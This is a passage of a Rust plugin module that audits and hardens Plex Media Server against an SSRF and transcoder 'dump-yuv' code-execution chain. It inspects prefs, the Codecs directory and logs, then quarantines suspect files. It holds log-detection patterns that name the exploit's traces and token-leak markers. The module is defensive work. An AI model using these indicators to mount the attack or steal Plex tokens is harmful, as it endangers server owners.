#![allow(clippy::disallowed_types)]

use plugin_toolkit::prelude::*;
use tokio::process::Command;

use crate::apt_repo::valid_target;
use crate::lifecycle::{self, PlexRestartArgs, Runtime};
use crate::storage::{capture, guest, guest_as};

pub const MIN_PATCHED_VERSION: &str = "1.42.2.10157";

const DEFAULT_DATA_DIR: &str =
    "/var/lib/plexmediaserver/Library/Application Support/Plex Media Server";

const MTIME_OUTLIER_SECS: f64 = 86_400.0;

const REMOTE_PREFS: &[&str] = &[
    "PublishServerOnPlexOnlineKey",
    "ManualPortMappingMode",
    "ManualPortMappingPort",
];

const GREP_PATTERNS: &[&str] = &[
    "/player/proxy/poll",
    "/player/timeline/subscribe",
    "protocol=http",
    "getresultfromnetwork",
    "/leak/",
    "plexscan-",
    "tkn_",
    "/:/prefs",
    "dump-yuv",
    "dump%2dyuv",
    "resources/x?resource_name=",
];

const QUARANTINE_ROOT: &str = "/var/lib/orca-quarantine/plex";

const QUARANTINE_NOTE: &str = "quarantined files sit in a root-owned 0700 dir under /var/lib/orca-quarantine/plex inside the guest; copy them off-box for analysis and delete";

const RECHECK_NOTE: &str =
    "kill transcoders and restart Plex only after a re-check reports no remaining Codecs suspects";

const MTIME_REASON: &str = "mtime differs from sibling majority";

const FOLLOW_UPS: &[&str] = &[
    "rotate the Plex owner token: sign out all devices at plex.tv (Account > Authorized Devices) and change the account password",
    "restart Plex Media Server so no loaded attacker library survives in memory",
];

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[schemars(crate = "plugin_toolkit::schemars")]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    Critical,
    Warning,
    Info,
    Unchecked,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[schemars(crate = "plugin_toolkit::schemars")]
#[serde(rename_all = "camelCase")]
pub struct SecurityFinding {
    pub kind: String,
    pub severity: Severity,
    pub detail: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[schemars(crate = "plugin_toolkit::schemars")]
#[serde(rename_all = "camelCase")]
pub struct LogIoc {
    pub indicator: String,
    pub severity: Severity,
    pub timestamp: Option<String>,
    pub source_ip: Option<String>,
    pub wan: bool,
    pub line: String,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize, JsonSchema)]
#[schemars(crate = "plugin_toolkit::schemars")]
#[serde(rename_all = "camelCase")]
pub struct CodecEntry {
    pub path: String,
    pub mtime: f64,
    pub symlink: bool,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[schemars(crate = "plugin_toolkit::schemars")]
#[serde(rename_all = "camelCase")]
pub struct CodecSuspect {
    pub path: String,
    pub severity: Severity,
    pub reasons: Vec<String>,
    pub quarantinable: bool,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[schemars(crate = "plugin_toolkit::schemars")]
#[serde(rename_all = "camelCase")]
pub struct PlexSecurityAuditReport {
    pub version: Option<String>,
    pub min_patched_version: String,
    pub complete: bool,
    pub clean: bool,
    pub findings: Vec<SecurityFinding>,
    pub remote_exposure: Vec<(String, String)>,
    pub codec_suspects: Vec<CodecSuspect>,
    pub log_iocs: Vec<LogIoc>,
    pub follow_ups: Vec<String>,
}

fn finding(kind: &str, severity: Severity, detail: impl Into<String>) -> SecurityFinding {
    SecurityFinding {
        kind: kind.to_string(),
        severity,
        detail: detail.into(),
    }
}

fn parse_version(v: &str) -> Vec<u64> {
    v.split('-')
        .next()
        .unwrap_or("")
        .split('.')
        .map(|p| p.parse().unwrap_or(0))
        .collect()
}

pub fn version_below(version: &str, minimum: &str) -> bool {
    parse_version(version) < parse_version(minimum)
}

fn is_transcoder_options(id: &str) -> bool {
    id.starts_with("Transcoder") && id.ends_with("Options")
}

fn has_so_ref(v: &str) -> bool {
    v.match_indices(".so").any(|(i, _)| {
        v[i + 3..]
            .chars()
            .next()
            .is_none_or(|c| c.is_ascii_digit() || !c.is_alphanumeric())
    })
}

fn value_is_suspicious(value: &str) -> bool {
    let v = value.to_ascii_lowercase();
    v.contains("dump-yuv") || has_so_ref(&v) || v.contains("/codecs/")
}

pub fn suspicious_prefs(prefs: &[(String, String)]) -> Vec<(String, String)> {
    prefs
        .iter()
        .filter(|(id, v)| {
            !v.trim().is_empty() && (is_transcoder_options(id) || value_is_suspicious(v))
        })
        .cloned()
        .collect()
}

pub fn prefs_to_clear(prefs: &[(String, String)]) -> Vec<String> {
    prefs
        .iter()
        .filter(|(id, v)| {
            !v.trim().is_empty()
                && (is_transcoder_options(id) || v.to_ascii_lowercase().contains("dump-yuv"))
        })
        .map(|(id, _)| id.clone())
        .collect()
}

pub fn is_shipped_codec(name: &str) -> bool {
    let Some(stem) = name.strip_prefix("lib").and_then(|n| {
        n.strip_suffix("_decoder.so")
            .or_else(|| n.strip_suffix("_encoder.so"))
    }) else {
        return false;
    };
    !stem.is_empty() && stem.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_')
}

pub fn parse_find_output(out: &str) -> Vec<CodecEntry> {
    out.split('\0')
        .filter(|r| !r.is_empty())
        .filter_map(|r| {
            let r = r.strip_prefix('\n').unwrap_or(r);
            let (mtime, rest) = r.split_once(' ')?;
            let (kind, path) = rest.split_once(' ')?;
            Some(CodecEntry {
                path: path.to_string(),
                mtime: mtime.parse().ok()?,
                symlink: kind == "l",
            })
        })
        .collect()
}

fn parent_of(path: &str) -> &str {
    path.rsplit_once('/').map(|(d, _)| d).unwrap_or("")
}

fn median(mut v: Vec<f64>) -> f64 {
    v.sort_by(|a, b| a.total_cmp(b));
    v[v.len() / 2]
}

pub fn classify_codecs(
    codecs_dir: &str,
    entries: &[CodecEntry],
    prefs: &[(String, String)],
) -> Vec<CodecSuspect> {
    let root = format!("{}/", codecs_dir.trim_end_matches('/'));
    let pref_values: Vec<String> = prefs
        .iter()
        .filter(|(_, v)| !v.trim().is_empty())
        .map(|(_, v)| v.clone())
        .collect();
    let mut out = Vec::new();
    for e in entries {
        let Some(rel) = e.path.strip_prefix(&root) else {
            continue;
        };
        let parts: Vec<&str> = rel.split('/').collect();
        let name = parts.last().copied().unwrap_or("");
        let protected = parts.len() == 1
            && (name == ".device-id"
                || (name.starts_with("EasyAudioEncoder-")
                    && name.contains("-linux-")
                    && name.ends_with(".zip")));
        let in_eae = parts.len() > 1 && parts[0].starts_with("EasyAudioEncoder-");
        let mut reasons = Vec::new();
        if e.symlink {
            reasons.push("symlink".to_string());
        }
        let name_ok = protected
            || in_eae
            || (parts.len() == 2 && parts[0].contains("-linux-") && is_shipped_codec(name));
        if !name_ok {
            reasons.push("unexpected name or location".to_string());
        }
        if pref_values
            .iter()
            .any(|v| v.contains(&e.path) || v.contains(&format!("/{name}")))
        {
            reasons.push("referenced by a pref value".to_string());
        }
        let parent = parent_of(&e.path);
        let siblings: Vec<f64> = entries
            .iter()
            .filter(|s| parent_of(&s.path) == parent)
            .map(|s| s.mtime)
            .collect();
        if siblings.len() >= 3 && (e.mtime - median(siblings)).abs() > MTIME_OUTLIER_SECS {
            reasons.push(MTIME_REASON.to_string());
        }
        if !reasons.is_empty() {
            let mtime_only = reasons.iter().all(|r| r == MTIME_REASON);
            out.push(CodecSuspect {
                path: e.path.clone(),
                severity: if mtime_only {
                    Severity::Warning
                } else {
                    Severity::Critical
                },
                reasons,
                quarantinable: !protected && !mtime_only,
            });
        }
    }
    out
}

fn redact_value(out: &mut String, s: &str, start: usize, stop: fn(u8) -> bool) -> usize {
    let bytes = s.as_bytes();
    let mut end = start;
    while end < bytes.len() && !stop(bytes[end]) {
        end += 1;
    }
    if end > start {
        out.push_str("***");
    }
    end
}

fn url_stop(b: u8) -> bool {
    matches!(b, b'&' | b' ' | b'"' | b'\'' | b']' | b'#')
}

fn segment_stop(b: u8) -> bool {
    matches!(b, b'/' | b'&' | b'?' | b' ' | b'"' | b'\'' | b'#' | b']')
}

fn param_stop(b: u8) -> bool {
    matches!(
        b,
        b'&' | b' ' | b'"' | b'\'' | b'#' | b']' | b',' | b';' | b'%'
    )
}

fn ident_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-')
}

pub fn scrub_tokens(line: &str) -> String {
    let s = plugin_toolkit::logging::scrub(line).into_owned();
    let lower = s.to_ascii_lowercase();
    let bytes = s.as_bytes();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while i < bytes.len() {
        let rest = &lower[i..];
        if rest.starts_with("getresultfromnetwork?url=") {
            let v = i + "getresultfromnetwork?url=".len();
            out.push_str(&s[i..v]);
            i = redact_value(&mut out, &s, v, url_stop);
            continue;
        }
        if rest.starts_with("/leak/") {
            out.push_str(&s[i..i + 6]);
            i = redact_value(&mut out, &s, i + 6, segment_stop);
            continue;
        }
        if rest.starts_with("tkn_") && (i == 0 || !ident_byte(bytes[i - 1])) {
            out.push_str(&s[i..i + 4]);
            i = redact_value(&mut out, &s, i + 4, |b| !b.is_ascii_alphanumeric());
            continue;
        }
        if ident_byte(bytes[i]) && (i == 0 || !ident_byte(bytes[i - 1])) {
            let mut end = i;
            while end < bytes.len() && ident_byte(bytes[end]) {
                end += 1;
            }
            let mut v = end;
            while v < bytes.len() && matches!(bytes[v], b' ' | b'"') {
                v += 1;
            }
            let encoded_sep = lower[v..].starts_with("%3d") || lower[v..].starts_with("%3a");
            if lower[i..end].contains("token")
                && v < bytes.len()
                && (matches!(bytes[v], b'=' | b':') || encoded_sep)
            {
                v += if encoded_sep { 3 } else { 1 };
                while v < bytes.len() && matches!(bytes[v], b' ' | b'"') {
                    v += 1;
                }
                out.push_str(&s[i..v]);
                if s[v..].starts_with("***") {
                    i = v;
                } else {
                    i = redact_value(&mut out, &s, v, param_stop);
                }
                continue;
            }
            out.push_str(&s[i..end]);
            i = end;
            continue;
        }
        let ch = s[i..].chars().next().unwrap_or('\0');
        out.push(ch);
        i += ch.len_utf8().max(1);
    }
    out
}

fn is_non_wan_ip(ip: &str) -> bool {
    match ip.parse::<std::net::IpAddr>() {
        Ok(std::net::IpAddr::V4(a)) => {
            let o = a.octets();
            a.is_private()
                || a.is_loopback()
                || a.is_unspecified()
                || a.is_link_local()
                || (o[0] == 100 && (o[1] & 0xc0) == 64)
        }
        Ok(std::net::IpAddr::V6(a)) => match a.to_ipv4_mapped() {
            Some(v4) => is_non_wan_ip(&v4.to_string()),
            None => {
                a.is_loopback()
                    || a.is_unspecified()
                    || (a.segments()[0] & 0xfe00) == 0xfc00
                    || (a.segments()[0] & 0xffc0) == 0xfe80
            }
        },
        Err(_) => false,
    }
}

fn split_addr(addr: &str) -> String {
    if let Some(rest) = addr.strip_prefix('[') {
        return rest.split(']').next().unwrap_or(rest).to_string();
    }
    if addr.matches(':').count() == 1 {
        return addr.split(':').next().unwrap_or(addr).to_string();
    }
    addr.to_string()
}

fn client_of(line: &str) -> (Option<String>, Option<bool>) {
    let Some(start) = line.find("Request: [") else {
        return (None, None);
    };
    let rest = &line[start + "Request: [".len()..];
    let segment = rest
        .split("] ")
        .next()
        .unwrap_or(rest)
        .trim_end_matches(']');
    let (inner, tag) = match segment.split_once(" (") {
        Some((a, t)) => (a, Some(t.trim_end_matches(')'))),
        None => (segment, None),
    };
    let ip = split_addr(inner);
    let wan = match tag {
        Some(t) => t.eq_ignore_ascii_case("WAN"),
        None => !is_non_wan_ip(&ip),
    };
    (Some(ip), Some(wan))
}

fn aton_part(p: &str) -> Option<u32> {
    if let Some(hex) = p.strip_prefix("0x").or_else(|| p.strip_prefix("0X")) {
        return u32::from_str_radix(hex, 16).ok();
    }
    if p.len() > 1 && p.starts_with('0') {
        return u32::from_str_radix(&p[1..], 8).ok();
    }
    p.parse().ok()
}

fn parse_ipv4_aton(host: &str) -> Option<std::net::Ipv4Addr> {
    let parts: Vec<&str> = host.split('.').collect();
    if parts.is_empty() || parts.len() > 4 || parts.iter().any(|p| p.is_empty()) {
        return None;
    }
    let nums = parts
        .iter()
        .map(|p| aton_part(p))
        .collect::<Option<Vec<u32>>>()?;
    let (head, last) = nums.split_at(nums.len() - 1);
    if head.iter().any(|&n| n > 255) {
        return None;
    }
    let rest_bits = 8 * (4 - head.len() as u32);
    if rest_bits < 32 && last[0] >= 1 << rest_bits {
        return None;
    }
    let mut n = 0u32;
    for (i, &b) in head.iter().enumerate() {
        n |= b << (24 - 8 * i as u32);
    }
    Some((n | last[0]).into())
}

fn parse_host_ip(host: &str) -> Option<std::net::IpAddr> {
    let host = host.trim_end_matches('.');
    if let Ok(ip) = host.parse() {
        return Some(ip);
    }
    parse_ipv4_aton(host).map(std::net::IpAddr::V4)
}

fn percent_decode_once(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'%' && i + 2 < b.len() {
            if let (Some(h), Some(l)) = (
                (b[i + 1] as char).to_digit(16),
                (b[i + 2] as char).to_digit(16),
            ) {
                out.push((h * 16 + l) as u8);
                i += 3;
                continue;
            }
        }
        out.push(b[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

fn percent_decode_stable(s: &str) -> String {
    let mut cur = s.to_string();
    for _ in 0..16 {
        let next = percent_decode_once(&cur);
        if next == cur {
            break;
        }
        cur = next;
    }
    cur
}

fn is_localhost_name(host: &str) -> bool {
    let h = host.trim_end_matches('.');
    h == "localhost" || h.ends_with(".localhost")
}

fn protocol_host(lower: &str) -> Option<String> {
    let p = lower.find("protocol=")?;
    let v = percent_decode_stable(&lower[p + "protocol=".len()..]).to_ascii_lowercase();
    let authority = v
        .split("://")
        .nth(1)?
        .split(['/', '?', '&', ' ', '#'])
        .next()?
        .to_string();
    let host = match authority.strip_prefix('[') {
        Some(rest) => rest.split(']').next().unwrap_or(rest).to_string(),
        None if authority.matches(':').count() <= 1 => {
            authority.split(':').next().unwrap_or("").to_string()
        }
        None => authority,
    };
    Some(host)
}

fn protocol_targets_server(lower: &str, server_ips: &[String]) -> bool {
    let Some(host) = protocol_host(lower) else {
        return false;
    };
    if is_localhost_name(&host) || server_ips.iter().any(|s| s.eq_ignore_ascii_case(&host)) {
        return true;
    }
    match parse_host_ip(&host) {
        Some(std::net::IpAddr::V6(a)) if a.to_ipv4_mapped().is_some() => a
            .to_ipv4_mapped()
            .is_some_and(|v4| v4.is_loopback() || v4.is_unspecified()),
        Some(ip) => ip.is_loopback() || ip.is_unspecified(),
        None => false,
    }
}

fn classify_line(
    lower: &str,
    wan: bool,
    server_ips: &[String],
) -> Option<(&'static str, Severity)> {
    let crit = Severity::Critical;
    if lower.contains("/player/timeline/subscribe") && lower.contains("protocol=http") {
        if wan || protocol_targets_server(lower, server_ips) {
            return Some(("timeline_subscribe_callback", crit));
        }
        return Some(("timeline_subscribe_callback", Severity::Warning));
    }
    if lower.contains("getresultfromnetwork") {
        return Some(("get_result_from_network", crit));
    }
    if lower.contains("/leak/") {
        return Some(("leak_path", crit));
    }
    if lower.contains("plexscan-") {
        return Some(("plexscan_player", crit));
    }
    if lower.contains("tkn_") {
        return Some(("tkn_marker", crit));
    }
    if lower.contains("put /:/prefs")
        && (lower.contains("dump-yuv")
            || lower.contains("dump%2dyuv")
            || (lower.contains("transcoder") && lower.contains("options=")))
    {
        return Some(("transcoder_pref_write", crit));
    }
    if lower.contains("resources/x?resource_name=") {
        return Some(("resource_read", crit));
    }
    if lower.contains("dump-yuv") || lower.contains("dump%2dyuv") {
        return Some(("dump_yuv", crit));
    }
    if lower.contains("/player/proxy/poll") || lower.contains("/player/timeline/subscribe") {
        return Some((
            "companion_player",
            if wan { crit } else { Severity::Warning },
        ));
    }
    None
}

pub fn parse_ioc_line(line: &str) -> Option<LogIoc> {
    parse_ioc_line_with(line, &[])
}

pub fn parse_ioc_line_with(line: &str, server_ips: &[String]) -> Option<LogIoc> {
    let (ip, wan) = client_of(line);
    let wan = wan.unwrap_or(false);
    let (indicator, severity) = classify_line(&line.to_ascii_lowercase(), wan, server_ips)?;
    let timestamp = line
        .split_once(" [")
        .map(|(t, _)| t.trim().to_string())
        .filter(|t| !t.is_empty());
    Some(LogIoc {
        indicator: indicator.to_string(),
        severity,
        timestamp,
        source_ip: ip,
        wan,
        line: scrub_tokens(line.trim()),
    })
}

pub fn parse_iocs(out: &str, server_ips: &[String]) -> Vec<LogIoc> {
    out.lines()
        .filter_map(|l| parse_ioc_line_with(l, server_ips))
        .collect()
}

fn has_control(s: &str) -> bool {
    s.chars().any(char::is_control)
}

fn has_dotdot(s: &str) -> bool {
    s.split('/').any(|seg| seg == "..")
}

pub fn valid_data_dir(dir: &str) -> bool {
    dir.starts_with('/') && !has_dotdot(dir) && !has_control(dir)
}

pub fn safe_codec_path(data_dir: &str, path: &str) -> bool {
    path.starts_with(&format!("{}/Codecs/", data_dir.trim_end_matches('/')))
        && !has_dotdot(path)
        && !has_control(path)
}

fn short_hash(s: &str) -> String {
    let mut h: u64 = 0xcbf2_9ce4_8422_2325;
    for b in s.bytes() {
        h ^= u64::from(b);
        h = h.wrapping_mul(0x0100_0000_01b3);
    }
    format!("{:08x}", h as u32)
}

pub fn quarantine_path(quarantine_dir: &str, codecs_dir: &str, file: &str) -> String {
    let root = format!("{}/", codecs_dir.trim_end_matches('/'));
    let full = file.strip_prefix(&root).unwrap_or(file);
    let rel = full.replace('/', "__");
    format!("{quarantine_dir}/{rel}.{}.quarantined", short_hash(full))
}

pub fn quarantine_dir(stamp: &str) -> String {
    format!("{QUARANTINE_ROOT}/{stamp}")
}

async fn output_of(mut cmd: Command) -> Result<(Option<i32>, String)> {
    let out = cmd
        .output()
        .await
        .context("failed to spawn guest command")?;
    Ok((
        out.status.code(),
        String::from_utf8_lossy(&out.stdout).into_owned(),
    ))
}

async fn list_codec_entries(
    runtime: Runtime,
    target: &str,
    data_dir: &str,
) -> Result<Vec<CodecEntry>> {
    let mut cmd = guest(runtime, target);
    cmd.arg("find")
        .arg(format!("{data_dir}/Codecs"))
        .arg("-mindepth")
        .arg("1")
        .arg("(")
        .arg("-type")
        .arg("f")
        .arg("-o")
        .arg("-type")
        .arg("l")
        .arg(")")
        .arg("-printf")
        .arg("%T@ %y %p\\0");
    let out = capture(cmd).await.context("list Codecs directory")?;
    Ok(parse_find_output(&out))
}

struct LogScan {
    output: String,
    partial: bool,
}

async fn scan_logs(runtime: Runtime, target: &str, data_dir: &str) -> Result<Option<LogScan>> {
    let mut find = guest(runtime, target);
    find.arg("find")
        .arg(format!("{data_dir}/Logs"))
        .arg("-maxdepth")
        .arg("1")
        .arg("-type")
        .arg("f")
        .arg("-name")
        .arg("Plex*.log")
        .arg("-print0");
    let listed = capture(find).await.context("list Plex logs")?;
    let logs: Vec<&str> = listed.split('\0').filter(|p| !p.is_empty()).collect();
    if logs.is_empty() {
        return Ok(None);
    }
    let mut cmd = guest(runtime, target);
    cmd.arg("grep").arg("-h").arg("-s").arg("-i").arg("-F");
    for p in GREP_PATTERNS {
        cmd.arg("-e").arg(p);
    }
    cmd.arg("--").args(&logs);
    let (code, out) = output_of(cmd).await?;
    match code {
        Some(0 | 1) => Ok(Some(LogScan {
            output: out,
            partial: false,
        })),
        Some(2) if !out.is_empty() => Ok(Some(LogScan {
            output: out,
            partial: true,
        })),
        _ => Ok(None),
    }
}

fn valid_user(u: &str) -> bool {
    !u.is_empty()
        && u.bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-'))
}

const DATA_DIR_OWNER_SH: &str = r#"[ ! -L "$1" ] || { echo "data_dir is a symlink" >&2; exit 3; }
[ "$(realpath -e -- "$1")" = "$1" ] || { echo "data_dir does not resolve to itself" >&2; exit 3; }
stat -L -c %u/%U -- "$1""#;

pub fn parse_owner(out: &str) -> Result<String> {
    let (uid, name) = out
        .trim()
        .split_once('/')
        .ok_or_else(|| anyhow!("unexpected stat output {out:?}"))?;
    if uid == "0" {
        bail!(
            "data_dir is owned by uid 0; pass run_as explicitly to quarantine as root-owned data"
        );
    }
    if !valid_user(name) || name == "UNKNOWN" {
        bail!("data_dir owner {name:?} is not a usable user name");
    }
    Ok(name.to_string())
}

async fn check_data_dir(runtime: Runtime, target: &str, data_dir: &str) -> Result<String> {
    let mut cmd = guest(runtime, target);
    cmd.arg("sh")
        .arg("-c")
        .arg(DATA_DIR_OWNER_SH)
        .arg("owner")
        .arg(data_dir);
    capture(cmd).await
}

fn checked(runtime: Runtime, target: Option<&str>, data_dir: &str) -> Result<()> {
    if !valid_data_dir(data_dir) {
        bail!("data_dir must be an absolute path without '..': {data_dir:?}");
    }
    if let Some(t) = target {
        if !valid_target(runtime, t) {
            bail!("invalid target {t:?}");
        }
    }
    Ok(())
}

#[derive(clap::Args, Serialize, Deserialize, JsonSchema)]
#[schemars(crate = "plugin_toolkit::schemars")]
pub struct PlexSecurityAuditArgs {
    /// Registered Plex endpoint to query over HTTP.
    pub endpoint: String,
    /// Where the instance runs: `lxc` or `docker`.
    #[arg(long, value_enum, default_value_t = Runtime::Lxc)]
    #[serde(default)]
    pub runtime: Runtime,
    /// LXC vmid or docker container name/id; without it Codecs and log checks are unchecked.
    #[arg(long)]
    #[serde(default)]
    pub target: Option<String>,
    /// Absolute Plex data directory inside the guest.
    #[arg(long, default_value_t = default_data_dir())]
    #[serde(default = "default_data_dir")]
    pub data_dir: String,
    /// The server's own IPs; a timeline/subscribe callback to one of them is critical.
    #[arg(long)]
    #[serde(default)]
    pub server_ips: Vec<String>,
}

fn default_data_dir() -> String {
    DEFAULT_DATA_DIR.to_string()
}

async fn audit(args: &PlexSecurityAuditArgs) -> Result<PlexSecurityAuditReport> {
    checked(args.runtime, args.target.as_deref(), &args.data_dir)?;
    let client = crate::tools::make_client(&args.endpoint)?;
    let mut findings = Vec::new();

    let version = client.identity_version().await.context("read /identity")?;
    match version.as_deref() {
        Some(v) if version_below(v, MIN_PATCHED_VERSION) => findings.push(finding(
            "version_unpatched",
            Severity::Critical,
            format!(
                "server {v} is below {MIN_PATCHED_VERSION} (unverified threshold: the next build after the exploited 1.42.2.10156)"
            ),
        )),
        Some(v) => findings.push(finding(
            "version",
            Severity::Info,
            format!("server {v}; threshold {MIN_PATCHED_VERSION} is unverified"),
        )),
        None => findings.push(finding(
            "version",
            Severity::Unchecked,
            "server did not report a version",
        )),
    }

    let prefs = client.prefs().await.context("read /:/prefs")?;
    for (id, value) in suspicious_prefs(&prefs) {
        findings.push(finding(
            "suspicious_pref",
            Severity::Critical,
            format!("{id} = {}", scrub_tokens(&value)),
        ));
    }
    let remote_exposure: Vec<(String, String)> = prefs
        .iter()
        .filter(|(id, _)| REMOTE_PREFS.contains(&id.as_str()))
        .cloned()
        .collect();
    if remote_exposure
        .iter()
        .any(|(id, v)| id == "PublishServerOnPlexOnlineKey" && matches!(v.as_str(), "1" | "true"))
    {
        findings.push(finding(
            "remote_access_enabled",
            Severity::Warning,
            "server is published for remote access",
        ));
    }

    let mut codec_suspects = Vec::new();
    let mut log_iocs = Vec::new();
    match args.target.as_deref() {
        None => {
            findings.push(finding("codecs", Severity::Unchecked, "no target given"));
            findings.push(finding("logs", Severity::Unchecked, "no target given"));
        }
        Some(t) => {
            let codecs_dir = format!("{}/Codecs", args.data_dir);
            match list_codec_entries(args.runtime, t, &args.data_dir).await {
                Ok(entries) => {
                    codec_suspects = classify_codecs(&codecs_dir, &entries, &prefs);
                    for s in &codec_suspects {
                        findings.push(finding(
                            "codec_suspect",
                            s.severity,
                            format!("{} ({})", s.path, s.reasons.join(", ")),
                        ));
                    }
                }
                Err(e) => findings.push(finding("codecs", Severity::Unchecked, format!("{e:#}"))),
            }
            match scan_logs(args.runtime, t, &args.data_dir).await {
                Ok(Some(scan)) => {
                    if scan.partial {
                        findings.push(finding(
                            "logs",
                            Severity::Unchecked,
                            "some Plex logs were unreadable",
                        ));
                    }
                    log_iocs = parse_iocs(&scan.output, &args.server_ips);
                    for sev in [Severity::Critical, Severity::Warning] {
                        let n = log_iocs.iter().filter(|i| i.severity == sev).count();
                        if n > 0 {
                            findings.push(finding(
                                "log_iocs",
                                sev,
                                format!("{n} exploit indicators in Plex logs"),
                            ));
                        }
                    }
                }
                Ok(None) => findings.push(finding(
                    "logs",
                    Severity::Unchecked,
                    "Plex logs not found or not readable",
                )),
                Err(e) => findings.push(finding("logs", Severity::Unchecked, format!("{e:#}"))),
            }
        }
    }

    let complete = !findings.iter().any(|f| f.severity == Severity::Unchecked);
    let clean = complete
        && !findings
            .iter()
            .any(|f| matches!(f.severity, Severity::Critical | Severity::Warning));
    let compromised = findings.iter().any(|f| f.severity == Severity::Critical);
    Ok(PlexSecurityAuditReport {
        version,
        min_patched_version: MIN_PATCHED_VERSION.to_string(),
        complete,
        clean,
        findings,
        remote_exposure,
        codec_suspects,
        log_iocs,
        follow_ups: if compromised {
            FOLLOW_UPS.iter().map(|s| s.to_string()).collect()
        } else {
            Vec::new()
        },
    })
}

/// **Audit a Plex server** for the companion-proxy SSRF / transcoder `dump-yuv`
/// RCE chain: version, suspicious prefs, Codecs directory tampering, log
/// indicators, and remote exposure. Read-only. A payload that reuses a shipped
/// codec name is only caught when a pref references it; mtime outliers alone
/// are warnings because Plex fetches codecs lazily.
#[orca_tool(domain = "plex", verb = "security_audit", role = "admin")]
async fn plex_security_audit(
    args: PlexSecurityAuditArgs,
    _ctx: &ToolCtx,
) -> Result<PlexSecurityAuditReport> {
    audit(&args).await
}

#[derive(clap::Args, Serialize, Deserialize, JsonSchema)]
#[schemars(crate = "plugin_toolkit::schemars")]
pub struct PlexSecurityHardenArgs {
    /// Registered Plex endpoint to query over HTTP.
    pub endpoint: String,
    /// Where the instance runs: `lxc` or `docker`.
    #[arg(long, value_enum, default_value_t = Runtime::Lxc)]
    #[serde(default)]
    pub runtime: Runtime,
    /// LXC vmid or docker container name/id; required for quarantine, kill and restart.
    #[arg(long)]
    #[serde(default)]
    pub target: Option<String>,
    /// Absolute Plex data directory inside the guest.
    #[arg(long, default_value_t = default_data_dir())]
    #[serde(default = "default_data_dir")]
    pub data_dir: String,
    /// Guest user for quarantine and transcoder kill; defaults to the owner of `data_dir`.
    #[arg(long)]
    #[serde(default)]
    pub run_as: Option<String>,
    /// Also set PublishServerOnPlexOnlineKey=0.
    #[arg(long)]
    #[serde(default)]
    pub disable_remote: bool,
    /// Kill running `Plex Transcoder` processes.
    #[arg(long)]
    #[serde(default)]
    pub kill_transcoders: bool,
    /// Restart Plex Media Server afterwards.
    #[arg(long)]
    #[serde(default)]
    pub restart: bool,
}

#[derive(Debug, Serialize, Deserialize, JsonSchema)]
#[schemars(crate = "plugin_toolkit::schemars")]
#[serde(rename_all = "camelCase")]
pub struct QuarantineResult {
    pub source: String,
    pub dest: String,
    pub reasons: Vec<String>,
    pub moved: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
}

#[derive(Debug, Serialize, Deserialize, JsonSchema)]
#[schemars(crate = "plugin_toolkit::schemars")]
#[serde(rename_all = "camelCase")]
pub struct PlexSecurityHardenOutput {
    pub dry_run: bool,
    pub cleared_prefs: Vec<String>,
    pub remote_disabled: bool,
    pub remote_disable_planned: bool,
    pub quarantine: Vec<QuarantineResult>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub run_as: Option<String>,
    pub remaining_suspects: Vec<String>,
    pub transcoders_killed: bool,
    pub restarted: bool,
    pub errors: Vec<String>,
    pub follow_ups: Vec<String>,
}

const MKQDIR_SH: &str = r#"set -eu
umask 077
[ "$(id -u)" = 0 ] || { echo "quarantine needs root in the guest" >&2; exit 3; }
for d in /var /var/lib /var/lib/orca-quarantine /var/lib/orca-quarantine/plex "$1"; do
  [ ! -L "$d" ] || { echo "symlink in quarantine path: $d" >&2; exit 3; }
  [ -d "$d" ] || mkdir -m 0700 -- "$d"
done
[ "$(stat -c %u:%a -- "$1")" = 0:700 ] || { echo "quarantine dir not root 0700" >&2; exit 3; }"#;

const QUARANTINE_SH: &str = r#"set -eu
src=$1 dest=$2 codecs=$3
dir=${src%/*} base=${src##*/}
[ "$(realpath -e -- "$codecs")" = "$codecs" ] || { echo "Codecs dir does not resolve to itself" >&2; exit 3; }
c=$dir
while :; do
  [ ! -L "$c" ] || { echo "symlinked parent: $c" >&2; exit 3; }
  [ "$c" != "$codecs" ] || break
  case "$c" in "$codecs"/*) c=${c%/*} ;; *) echo "parent escapes Codecs" >&2; exit 3 ;; esac
done
cd -P -- "$dir"
case "$(pwd -P)/" in "$codecs"/*) ;; *) echo "realpath escapes Codecs" >&2; exit 3 ;; esac
mv -n -T -- "./$base" "$dest"
[ ! -e "./$base" ] && [ ! -L "./$base" ] || { echo "source still present" >&2; exit 4; }
[ -e "$dest" ] || [ -L "$dest" ] || { echo "destination missing" >&2; exit 4; }
if [ ! -L "$dest" ] && [ -f "$dest" ] && [ "$(stat -c %h -- "$dest")" = 1 ]; then chmod 000 -- "$dest"; fi"#;

async fn make_quarantine_dir(runtime: Runtime, target: &str, qdir: &str) -> Result<()> {
    let mut mk = guest_as(runtime, target, "root");
    mk.arg("sh")
        .arg("-c")
        .arg(MKQDIR_SH)
        .arg("mkqdir")
        .arg(qdir);
    capture(mk).await?;
    Ok(())
}

async fn quarantine_one(
    runtime: Runtime,
    target: &str,
    codecs_dir: &str,
    src: &str,
    dest: &str,
) -> Result<()> {
    let mut mv = guest_as(runtime, target, "root");
    mv.arg("sh")
        .arg("-c")
        .arg(QUARANTINE_SH)
        .arg("quarantine")
        .arg(src)
        .arg(dest)
        .arg(codecs_dir);
    capture(mv).await.context("quarantine move")?;
    Ok(())
}

pub fn remaining_suspects(
    codecs_dir: &str,
    entries: &[CodecEntry],
    prefs: &[(String, String)],
) -> Vec<String> {
